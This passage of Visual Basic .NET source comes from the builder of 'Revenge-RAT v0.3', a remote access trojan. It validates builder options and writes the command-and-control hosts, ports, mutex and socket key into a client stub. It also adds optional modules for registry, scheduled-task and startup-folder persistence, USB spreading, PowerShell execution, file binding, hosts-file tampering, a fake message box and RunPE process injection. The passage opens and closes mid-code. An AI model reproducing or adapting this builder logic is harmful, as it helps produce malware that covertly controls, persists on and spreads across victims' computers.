                logs.C(Color.CornflowerBlue, "Building Process Aborted. You must add a host or ip and port!")
            Else
                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                logs.C(Color.CornflowerBlue, "Add Host - Port!" & ChrW(13) & ChrW(10))
                If (Me.ClientID.Text = Nothing) Then
                    logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                    logs.C(Color.CornflowerBlue, "Building Process Aborted. You must add a identifier for your clients!")
                Else
                    logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                    logs.C(Color.CornflowerBlue, "Add client identifier!" & ChrW(13) & ChrW(10))
                    If (Me.ClientMutex.Text = Nothing) Then
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Building Process Aborted. You must add a mutex for your clients!")
                    Else
                        Dim rV As String
                        Dim enumerator As IEnumerator
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Add mutex!" & ChrW(13) & ChrW(10))
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Check Install Settings!" & ChrW(13) & ChrW(10))
                        If Me.DF.Checked Then
                            If (Me.DropPathCombo.SelectedIndex = -1) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must select a path to drop client to it!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.DN.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must select a name for your client in drop path!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add drop codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remvoe drop codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.Registry.Checked Then
                            If (Me.RK.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a registry key!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.RGVN.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a name for the value!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Registry codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remvoe Registry codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.SCHULDER.Checked Then
                            If (Me.Schname.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a scheduled task name!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add scheduler task codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remvoe scheduler task codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.CMPM.Checked Then
                            If (Me.CNINAPPDATA.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a client name!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.TASKBARFN.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a taskbar folder name!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.DESKTOPSHORTCUTPATH.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a desktop folder name!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.QUICKLUNCHSHORTCUTPATH.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a quick launch folder name!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Complex method codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove Complex method codes!" & ChrW(13) & ChrW(10))
                        End If
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Check Startup Settings!" & ChrW(13) & ChrW(10))
                        If Me.StartupNormal.Checked Then
                            If (Me.StartNormalfile.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a client name in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup normal install codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove Startup normal install codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.VBSCK.Checked Then
                            If (Me.VBSTX.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a name for vbs in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add vbs codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove vbs codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.JSCK.Checked Then
                            If (Me.JSTX.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a name for js file in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add js codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove js codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.LNKCK.Checked Then
                            If (Me.LNKTX.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a name for shortcut (.lnk) in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add shortcut (.lnk) codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove shortcut (.lnk) codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.URLCK.Checked Then
                            If (Me.URLTX.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a name for shortcut (.url) in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add shortcut (.url) codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove shortcut (.url) codes!" & ChrW(13) & ChrW(10))
                        End If
                        If Me.StartupCodeDomCK.Checked Then
                            If (Me.CodeDomTX.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a compiled name in startup folder!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add CodeDom (.exe) codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove CodeDom (.exe) codes!" & ChrW(13) & ChrW(10))
                        End If
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Check Powershell Settings!" & ChrW(13) & ChrW(10))
                        If Me.ENBPS.Checked Then
                            If (Me.PSCommands.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add powershell commands!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Powershell codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove Powershell codes!" & ChrW(13) & ChrW(10))
                        End If
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Check Notification Settings!" & ChrW(13) & ChrW(10))
                        If Me.SMGB.Checked Then
                            If (Me.MsgboxBody.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a body for message!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.MsgboxTitle.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add a title for message!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Notification codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove Notification codes!" & ChrW(13) & ChrW(10))
                        End If
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Check USB Spread Settings!" & ChrW(13) & ChrW(10))
                        If Me.EUSB.Checked Then
                            If (Me.CNINUS.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add client name in usb!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            If (Me.FNIUS.Text = Nothing) Then
                                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                                logs.C(Color.CornflowerBlue, "You must add folder name in usb!" & ChrW(13) & ChrW(10))
                                Return
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add USB Spread codes!" & ChrW(13) & ChrW(10))
                        Else
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Remove USB Spread codes!" & ChrW(13) & ChrW(10))
                        End If
                        Dim newValue As String = String.Empty
                        Dim str3 As String = String.Empty
                        If Me.EUSB.Checked Then
                            rV = My.Resources.RV
                        Else
                            If Not File.Exists((Application.StartupPath & "\RV.IL")) Then
                                MessageBox.Show("Stub ( ""RV.IL"" ) Not found!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                                Return
                            End If
                            rV = File.ReadAllText((Application.StartupPath & "\RV.IL"))
                        End If
                        Try
                            enumerator = Me.HostsList.Items.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                newValue = (newValue & current.SubItems.Item(0).Text & ",")
                                str3 = (str3 & current.SubItems.Item(1).Text & ",")
                            Loop
                        Finally
                        End Try
                        logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                        logs.C(Color.CornflowerBlue, "Add hosts - mutex - id - reconnect delay - socket key to client!" & ChrW(13) & ChrW(10))
                        rV = rV.Replace("%H%", newValue).Replace("%P%", str3).Replace("%ID%", Conversions.ToString(SocketServer.Encode(Me.ClientID.Text))).Replace("%MUT%", Me.ClientMutex.Text).Replace("%RE%", Me.RCD.Value.ToString).Replace("%Socket Key%", Me.Key)
                        If Me.DF.Checked Then
                            Dim num As Integer
                            If (Me.DropPathCombo.SelectedIndex = 0) Then
                                num = &H1A
                            ElseIf (Me.DropPathCombo.SelectedIndex = 1) Then
                                num = 5
                            ElseIf (Me.DropPathCombo.SelectedIndex = 2) Then
                                num = 11
                            ElseIf (Me.DropPathCombo.SelectedIndex = 3) Then
                                num = &H15
                            ElseIf (Me.DropPathCombo.SelectedIndex = 4) Then
                                num = &H25
                            ElseIf (Me.DropPathCombo.SelectedIndex = 5) Then
                                num = &H22
                            ElseIf (Me.DropPathCombo.SelectedIndex = 6) Then
                                num = 8
                            End If
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%CopyClient%", My.Resources.CopyClientUSB)
                            Else
                                rV = rV.Replace("%CopyClient%", My.Resources.CopyClient)
                            End If
                            rV = rV.Replace("%DFN%", Conversions.ToString(num)).Replace("%DN%", Me.DN.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Drop Path - File name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%CopyClient%", "")
                        End If
                        If Me.RGP.Checked Then
                            If Me.Registry.Checked Then
                                If Me.EUSB.Checked Then
                                    rV = rV.Replace("%RegistryCall%", My.Resources.RegistryCallUSB).Replace("%RegistryMethod%", My.Resources.RegistryMethodUSB)
                                Else
                                    rV = rV.Replace("%RegistryCall%", My.Resources.RegistryCall).Replace("%RegistryMethod%", My.Resources.RegistryMethod)
                                End If
                            Else
                                rV = rV.Replace("%RegistryCall%", "").Replace("%RegistryMethod%", "")
                            End If
                        Else
                            rV = rV.Replace("%RegistryCall%", "").Replace("%RegistryMethod%", "")
                        End If
                        If Me.Registry.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%Registry%", My.Resources.RegistryUSB)
                            Else
                                rV = rV.Replace("%Registry%", My.Resources.Registry)
                            End If
                            rV = rV.Replace("%RGP%", Me.RK.Text.Replace("\", "\\")).Replace("%REGV%", Me.RGVN.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Registry Key - value name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%Registry%", "")
                        End If
                        If Me.SCHULDER.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%ShuldedTask%", My.Resources.ShuldedTaskUSB)
                            Else
                                rV = rV.Replace("%ShuldedTask%", My.Resources.ShuldedTask)
                            End If
                            rV = rV.Replace("%TT%", Me.Schtime.Value.ToString).Replace("%TNINL%", Me.Schname.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Scheduled task time - value name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%ShuldedTask%", "")
                        End If
                        If Me.CMPM.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%ComplexThread%", My.Resources.ComplexCallUSB).Replace("%ComplexMethod%", My.Resources.ComplexMethodUSB)
                            Else
                                rV = rV.Replace("%ComplexThread%", My.Resources.ComplexCall).Replace("%ComplexMethod%", My.Resources.ComplexMethod)
                            End If
                            rV = rV.Replace("%CLNITS%", Me.CNINAPPDATA.Text).Replace("%MoveFolderName%", Me.TASKBARFN.Text).Replace("%DesktopShortcuts%", Me.DESKTOPSHORTCUTPATH.Text).Replace("%QuickLaunch%", Me.QUICKLUNCHSHORTCUTPATH.Text).Replace("RVRSINF", Me.RandomVariable(6, 12))
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Complex Method Settings to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%ComplexThread%", "").Replace("%ComplexMethod%", "")
                        End If
                        If Me.StartupNormal.Checked Then
                            If Me.EUSB.Checked Then
                                Dim copyStartupUSB As String = My.Resources.CopyStartupUSB
                                If Me.DF.Checked Then
                                    copyStartupUSB = copyStartupUSB.Replace("%RUNPRO%", "")
                                Else
                                    copyStartupUSB = copyStartupUSB.Replace("%RUNPRO%", My.Resources.RUNFUSB)
                                End If
                                rV = rV.Replace("%CopyStartup%", copyStartupUSB)
                            Else
                                Dim copyStartup As String = My.Resources.CopyStartup
                                If Me.DF.Checked Then
                                    copyStartup = copyStartup.Replace("%RUNPRO%", "")
                                Else
                                    copyStartup = copyStartup.Replace("%RUNPRO%", My.Resources.RUNF)
                                End If
                                rV = rV.Replace("%CopyStartup%", copyStartup)
                            End If
                            rV = rV.Replace("%STF%.EXE", Me.StartNormalfile.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup client name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%CopyStartup%", "")
                        End If
                        If Me.VBSCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%CopyStartupVBS%", My.Resources.CopyVBSUsb)
                            Else
                                rV = rV.Replace("%CopyStartupVBS%", My.Resources.CopyVBS)
                            End If
                            rV = rV.Replace("%V%", Me.VBSTX.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup vbs name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%CopyStartupVBS%", "")
                        End If
                        If Me.JSCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%CopyStartupJS%", My.Resources.CopyJSUSB)
                            Else
                                rV = rV.Replace("%CopyStartupJS%", My.Resources.CopyJS)
                            End If
                            rV = rV.Replace("%J%", Me.JSTX.Text).Replace("activeXObj", Me.RandomVariable(4, 7))
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup js name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%CopyStartupJS%", "")
                        End If
                        If Me.LNKCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%ShortcutLnk%", My.Resources.ShortcutLNKUSB)
                            Else
                                rV = rV.Replace("%ShortcutLnk%", My.Resources.ShortcutLnk)
                            End If
                            rV = rV.Replace("%SCN%", Me.LNKTX.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup .lnk name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%ShortcutLnk%", "")
                        End If
                        If Me.URLCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%ShortcutURL%", My.Resources.ShortcutURLUSB)
                            Else
                                rV = rV.Replace("%ShortcutURL%", My.Resources.ShortcutURL)
                            End If
                            rV = rV.Replace("%SCNU%", Me.URLTX.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup .url name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%ShortcutURL%", "")
                        End If
                        If Me.StartupCodeDomCK.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%CodeDomStartup%", My.Resources.CopyCodeDomStartupUSB)
                            Else
                                rV = rV.Replace("%CodeDomStartup%", My.Resources.CopyCodeDomStartup)
                            End If
                            rV = rV.Replace("Revenge_RAT", Me.RandomVariable(4, 7)).Replace("%CodeDom%.EXE", Me.CodeDomTX.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Startup .CodeDom name to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%CodeDomStartup%", "")
                        End If
                        If Me.ENBPS.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%PowerShell%", My.Resources.PowerShellUSB)
                            Else
                                rV = rV.Replace("%PowerShell%", My.Resources.PowerShell)
                            End If
                            rV = rV.Replace("%PSC%", Me.PSCommands.Text)
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Powershell codes to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%PowerShell%", "")
                        End If
                        If (Me.BinderFilesList.Items.Count > 0) Then
                            Dim str7 As String
                            Dim str8 As String
                            Dim enumerator2 As IEnumerator
                            Try
                                enumerator2 = Me.BinderFilesList.Items.GetEnumerator
                                Do While enumerator2.MoveNext
                                    Dim item2 As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                                    str7 = (str7 & Convert.ToBase64String(SocketServer.Compress(File.ReadAllBytes(item2.SubItems.Item(0).Text))) & "|_RVR_|")
                                    str8 = (str8 & SocketServer.GenRandom(1, 10) & item2.SubItems.Item(1).Text & "|_RVR_|")
                                Loop
                            Finally
                            End Try
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Binded bytes to client!" & ChrW(13) & ChrW(10))
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%Binder%", My.Resources.BinderUSB)
                            Else
                                rV = rV.Replace("%Binder%", My.Resources.Binder)
                            End If
                            rV = rV.Replace("%Bytes%", str7).Replace("%Names%", str8)
                        Else
                            rV = rV.Replace("%Binder%", "")
                        End If
                        If (Me.Hostsfilelist.Items.Count > 0) Then
                            Dim str9 As String
                            Dim str10 As String
                            Dim enumerator3 As IEnumerator
                            Try
                                enumerator3 = Me.Hostsfilelist.Items.GetEnumerator
                                Do While enumerator3.MoveNext
                                    Dim item3 As ListViewItem = DirectCast(enumerator3.Current, ListViewItem)
                                    str10 = (str10 & item3.SubItems.Item(0).Text & "|")
                                    str9 = (str9 & item3.SubItems.Item(1).Text & "|")
                                Loop
                            Finally
                                If TypeOf enumerator3 Is IDisposable Then
                                    TryCast(enumerator3, IDisposable).Dispose()
                                End If
                            End Try
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add hosts to client!" & ChrW(13) & ChrW(10))
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%HostsFile%", My.Resources.HostsFileUSB)
                            Else
                                rV = rV.Replace("%HostsFile%", My.Resources.HostsFile)
                            End If
                            rV = rV.Replace("%IP%", str10).Replace("%Sites%", str9)
                        Else
                            rV = rV.Replace("%HostsFile%", "")
                        End If
                        If Me.SMGB.Checked Then
                            Dim strArray As String() = Strings.Split(Conversions.ToString(Me.MsgboxSettings(Me.MsgboxButton.SelectedIndex, Me.MsgBoxIcon.SelectedIndex)), "|", -1, CompareMethod.Binary)
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%FKMSG%", My.Resources.FKMSGUSB)
                            Else
                                rV = rV.Replace("%FKMSG%", My.Resources.FKMSG)
                            End If
                            rV = rV.Replace("%Body%", Me.MsgboxBody.Text.Replace(ChrW(13) & ChrW(10), "\r\n")).Replace("%Title%", Me.MsgboxTitle.Text).Replace("%Icon%", strArray(0)).Replace("%Button%", strArray(1))
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add Notification settings to client!" & ChrW(13) & ChrW(10))
                        Else
                            rV = rV.Replace("%FKMSG%", "")
                        End If
                        If Me.IE.Checked Then
                            If Me.EUSB.Checked Then
                                rV = rV.Replace("%InjectCall%", My.Resources.InjectCallUSB).Replace("%RunPEClass%", My.Resources.RunPEClassUSB)
                            Else
                                rV = rV.Replace("%InjectCall%", My.Resources.InjectCall).Replace("%RunPEClass%", My.Resources.RunPEClass)
                            End If
                            If (Me.VI.SelectedIndex = 0) Then
                                rV = rV.Replace("%IV%", "v2.0.50727")
                            ElseIf (Me.VI.SelectedIndex = 1) Then
                                rV = rV.Replace("%IV%", "v4.0.30319")
                            Else
                                rV = rV.Replace("%IV%", "v2.0.50727")
                            End If
                            logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
                            logs.C(Color.CornflowerBlue, "Add target net framework version to inject to it to client!" & ChrW(13) & ChrW(10))
                            rV = rV.Replace("%PI%", Me.PI.Items.Item(Me.PI.SelectedIndex).ToString).Replace("%TXTFN%", Me.RandomVariable(5, 10))
